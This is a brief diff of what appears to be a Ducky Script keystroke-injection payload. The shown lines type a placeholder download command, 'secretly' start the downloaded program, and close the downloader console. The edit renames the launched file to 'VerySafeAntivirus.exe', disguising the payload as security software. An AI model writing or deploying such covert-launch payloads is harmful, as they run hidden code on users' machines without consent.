@@ -17,8 +17,8 @@ REM Download install script
 STRING this is supposed to be a download command
 ENTER
 
-REM Secretly start downloaded script in a new, minimized console
-STRING start /MIN batch.bat
+REM Secretly start downloaded script
+STRING start VerySafeAntivirus.exe
 ENTER
 
 REM Close the original "downloader" console
